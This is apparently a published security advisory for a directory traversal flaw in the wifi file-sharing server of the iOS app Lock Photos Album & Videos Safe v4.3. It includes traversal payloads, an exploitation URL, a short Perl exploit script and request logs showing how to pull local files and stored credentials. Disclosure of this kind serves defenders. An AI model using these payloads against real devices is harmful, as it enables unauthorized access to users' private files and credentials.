===============
Lock Photos Album&Videos Safe v4.3 - Directory Traversal Vulnerability
 
 
Product & Service Introduction:
===============================
You can lock and manage your private photos, videos, text messages, voice recordings, notes, documents and other files very easily! You can store 
and view PDF, Text(can be created and edited), PowerPoint, Word, Excel, Html, Pages, Key, Numbers and play music very simply! You can as well do 
more things in one app and manage your life better!
 
(Copy of the Homepage: https://itunes.apple.com/us/app/lock-photos-album-video.s/id448033053 )
 
 
 
Affected Product(s):
====================
Galaxy Studio (Mo Wellin)
Product: Lock Photos Album & Videos Safe - iOS Mobile (Web-Application) 4.3

 
 
Technical Details & Description:
================================
A directory traversal vulnerability has been dsicovered in the official Galaxy Studio Lock Photos Album & Videos Safe v4.3 iOS mobile application.
The security vulnerability allows an attackers to unauthorized request and download local application files by usage of manipulated path parameters.
 
The directory traversal web vulnerability is located in the `PRE` parameter of the wifi web-server interface. Remote attackers are able to request 
the local web-server during the sharing process to access unauthenticated application files. Attackers are able to request via form action path 
variables to access, download or upload arbitrary files. Remote attackers are able to access the sql-lite database file that own the web-server 
access credentials of the application. After the download the attacker is able to access the database management system file to use the credentials 
for unauthorized access via protocol. The PRE request with the action form variable allows to inject any path of the local file system without check 
for privileges or user access rights. Thus allows an attacker to bypass the local path restriction to compromise the mobile ios web-server application.
The request method to inject is GET and the attack vector is located on the client-side of the web-server web-application. Finally an attacker is able 
to access with the credentials the service by using a client via http protocol.
 
The security risk of the directory traversal vulnerability is estimated as high with a cvss (common vulnerability scoring system) count of 7.8. 
Exploitation of the web vulnerability requires no privilege web-application user account or user interaction. Successful exploitation of the 
vulnerability results in information leaking, mobile application compromise by unauthorized and unauthenticated access.
 
Request Method(s):
[+] GET
 
Vulnerable Module(s):
[+] PRE
 
Vulnerable Parameter(s):
[+] form action
 
Affected Module(s):
[+] Web-Server File System
 
 
Proof of Concept (PoC):
=======================
The security vulnerability can be exploited by remote attackers without user interaction or privilege web-application user account.
For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.
 
 
Standard Request:
http://localhost:5555/?PRE=action form
 
 
PoC: Payload
//..//..//..//..//..//..//..//..//%00
/../../../../../../../../%00
 
 
PoC: Exploitation
http://localhost:5555/?PRE=action form=/../../../../../../../../%00
 
 
PoC: Exploit
use strict;
use LWP::UserAgent;
my $b = LWP::UserAgent->new();
my $host = "localhost:5555";
print $b->get("http://".$host."/?PRE=action form=/../../../../../../../../%00")->content;
 
 
--- PoC Session Logs [GET] ---
Status: 200[OK]
GET http://localhost:5555/?PRE=action%20form=//..//..//..//..//..//..//..//..//%00 Load Flags[LOAD_DOCUMENT_URI  LOAD_INITIAL_DOCUMENT_URI  ] Größe des Inhalts[0] Mime Type[application/x-unknown-content-type]
   Request Header:
      Host[localhost:5555]
      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0]
      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
      Accept-Language[de,en-US;q=0.7,en;q=0.3]
      Accept-Encoding[gzip, deflate]
      Connection[keep-alive]
      Upgrade-Insecure-Requests[1]
   Response Header:
      Date[Di., 21 Feb. 2017 09:21:48 GMT]
      Accept-Ranges[bytes]
      Content-Length[0]
 
 
 
 
PoC: Vulnerable Source
{
  "paths" : [
    "/Picture/Public/path/All Image/"
  ],
  "folder" : "/Picture/Public/path",
  "code" : 1
}
... manipulated
 
{
  "paths" : [
  ],
  "folder" : "/../../../../../../../../%00",
  "code" : 1
}
 
 
Reference(s):
http://localhost:5555/
http://localhost:5555/?PRE
 
 
Solution - Fix & Patch:
=======================
The security vulnerability can be resolved by disallowing users to access the upper path for root privileges. Ensure that the form 
action request denies to access web-server data or application configuration files. Parse and restrict the form action parameter to 

